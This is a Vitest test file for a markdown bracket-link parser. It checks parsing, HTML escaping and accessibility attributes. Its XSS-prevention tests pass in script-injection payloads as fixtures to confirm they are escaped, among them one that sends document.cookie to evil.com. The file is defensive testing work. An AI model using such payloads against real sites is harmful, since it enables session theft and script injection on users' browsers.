import { describe, it, expect } from 'vitest'
import { bracketParser } from './bracketParser'

/**
 * Helper to simulate remark tree processing.
 * Creates a minimal MDAST tree with a text node and runs the parser.
 */
function processText(text: string) {
  const tree = {
    type: 'root' as const,
    children: [{ type: 'text' as const, value: text }],
  }
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  bracketParser()(tree as any)
  return tree.children
}

describe('bracketParser', () => {
  describe('basic parsing', () => {
    it('parses artifact syntax [[word:id]]', () => {
      const result = processText('Check this [[demo:abc123]]')
      expect(result).toHaveLength(2)
      expect(result[0]).toEqual({ type: 'text', value: 'Check this ' })
      expect(result[1].type).toBe('html')
      expect(result[1].value).toContain('data-type="artifact"')
      expect(result[1].value).toContain('data-trigger="demo"')
      expect(result[1].value).toContain('data-content="abc123"')
    })

    it('parses URL syntax [[word:https://...]]', () => {
      const result = processText('Visit [[site:https://example.com]]')
      expect(result[1].value).toContain('data-type="site"')
      expect(result[1].value).toContain('data-content="https%3A%2F%2Fexample.com"')
    })

    it('parses explicit artifact type [[word:artifact:id]]', () => {
      const result = processText('See [[demo:artifact:abc123]]')
      expect(result[1].value).toContain('data-type="artifact"')
      expect(result[1].value).toContain('data-content="abc123"')
    })

    it('parses explicit site type [[word:site:url]]', () => {
      const result = processText('See [[demo:site:https://example.com]]')
      expect(result[1].value).toContain('data-type="site"')
    })

    it('handles multiple brackets in one text', () => {
      const result = processText('First [[a:1]] and second [[b:2]]')
      expect(result).toHaveLength(4)
      expect(result[0]).toEqual({ type: 'text', value: 'First ' })
      expect(result[1].type).toBe('html')
      expect(result[2]).toEqual({ type: 'text', value: ' and second ' })
      expect(result[3].type).toBe('html')
    })

    it('preserves text before and after brackets', () => {
      const result = processText('Before [[link:id]] after')
      expect(result[0]).toEqual({ type: 'text', value: 'Before ' })
      expect(result[2]).toEqual({ type: 'text', value: ' after' })
    })
  })

  describe('XSS prevention', () => {
    it('escapes HTML script tags in trigger text', () => {
      const result = processText('[[<script>alert("xss")</script>:abc123]]')
      expect(result[0].value).not.toContain('<script>')
      expect(result[0].value).toContain('&lt;script&gt;')
      expect(result[0].value).toContain('&lt;/script&gt;')
    })

    it('escapes double quotes in trigger text', () => {
      const result = processText('[[test" onmouseover="alert(1):abc123]]')
      expect(result[0].value).not.toContain('" onmouseover')
      expect(result[0].value).toContain('&quot;')
    })

    it('escapes single quotes in trigger text', () => {
      const result = processText("[[test' onclick='alert(1):abc123]]")
      expect(result[0].value).not.toContain("' onclick")
      expect(result[0].value).toContain('&#39;')
    })

    it('escapes ampersands in trigger text', () => {
      const result = processText('[[test&test:abc123]]')
      expect(result[0].value).toContain('test&amp;test')
    })

    it('escapes angle brackets in trigger text', () => {
      const result = processText('[[<img src=x onerror=alert(1)>:abc123]]')
      expect(result[0].value).not.toContain('<img')
      expect(result[0].value).toContain('&lt;img')
      expect(result[0].value).toContain('&gt;')
    })

    it('escapes attribute injection attempts', () => {
      const result = processText('[[test"><img src=x>:abc123]]')
      // Should not be able to break out of attributes
      expect(result[0].value).not.toContain('><img')
      expect(result[0].value).toContain('&quot;&gt;&lt;img')
    })

    it('escapes complex XSS payloads', () => {
      const payload = '[[</span><script>document.location="http://evil.com/?c="+document.cookie</script><span class=":abc123]]'
      const result = processText(payload)
      // The payload should be escaped, not executed
      expect(result[0].value).not.toContain('</span><script>')
      expect(result[0].value).toContain('&lt;/span&gt;&lt;script&gt;')
    })
  })

  describe('edge cases', () => {
    it('ignores malformed brackets without colon', () => {
      const result = processText('Not a [[bracket without colon]]')
      expect(result).toHaveLength(1)
      expect(result[0].type).toBe('text')
      expect(result[0].value).toBe('Not a [[bracket without colon]]')
    })

    it('ignores partial brackets', () => {
      const result = processText('Partial [[partial:')
      expect(result).toHaveLength(1)
      expect(result[0].type).toBe('text')
    })

    it('handles empty content after colon', () => {
      // Empty content should still match the regex
      const result = processText('[[trigger:]]')
      // The regex requires at least one character after colon
      expect(result).toHaveLength(1)
    })

    it('handles special characters in content (URL-encoded)', () => {
      const result = processText('[[demo:content with spaces]]')
      expect(result[0].value).toContain('data-content="content%20with%20spaces"')
    })

    it('handles triggers with spaces', () => {
      const result = processText('[[my trigger:abc123]]')
      expect(result[0].value).toContain('data-trigger="my trigger"')
    })

    it('returns original text when no brackets found', () => {
      const result = processText('Just plain text')
      expect(result).toHaveLength(1)
      expect(result[0]).toEqual({ type: 'text', value: 'Just plain text' })
    })
  })

  describe('accessibility attributes', () => {
    it('includes role="button" for accessibility', () => {
      const result = processText('[[link:id]]')
      expect(result[0].value).toContain('role="button"')
    })

    it('includes tabindex="0" for keyboard navigation', () => {
      const result = processText('[[link:id]]')
      expect(result[0].value).toContain('tabindex="0"')
    })

    it('includes bracket-link class for styling', () => {
      const result = processText('[[link:id]]')
      expect(result[0].value).toContain('class="bracket-link"')
    })
  })
})
